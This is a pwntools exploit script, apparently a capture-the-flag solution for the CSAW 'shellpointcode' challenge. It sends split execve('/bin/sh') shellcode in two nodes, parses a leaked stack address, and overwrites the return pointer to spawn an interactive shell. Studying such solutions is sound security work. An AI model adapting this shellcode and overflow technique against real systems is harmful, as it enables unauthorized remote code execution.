#!/usr/bin/env python2.7
from pwn import *
binary_path = "./shellpointcode"

SERVER = "pwn.chal.csaw.io"
PORT = 9005
# Change to False to interact with the server
local = False
if local:
   p = process(binary_path, timeout=9999)
else:
   p = remote(SERVER, PORT, timeout=9999)

"""
    xor rsi, rsi
    push 59
    pop rax
    push rbx
    mov rdi, rsp

    syscall
"""
node_1 = "\x48\x31\xf6\x6a\x3b\x58\x53\x48\x89\xe7\x0f\x05"

"""
    mov rbx, 0xff978cd091969dd0
    not rbx
    jmp short $+20
"""
node_2 = "\x48\xbb\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd3\xeb\x12"

padding = 'A'*11

p.sendline(node_1)
p.sendline(node_2)
p.recvuntil("node.next:")

# parse the leaked address
node_2_addr = p.recvline()
"""
we add 8 to the leaked address, because our input is at 
offset 8 from the start of node 2 which is the leaked address, being the first 8 bytes reserved to the pointer to the next node on the list.
"""
rip = p64(int(node_2_addr, 16) + 8)
p.sendline(padding + rip)
p.interactive()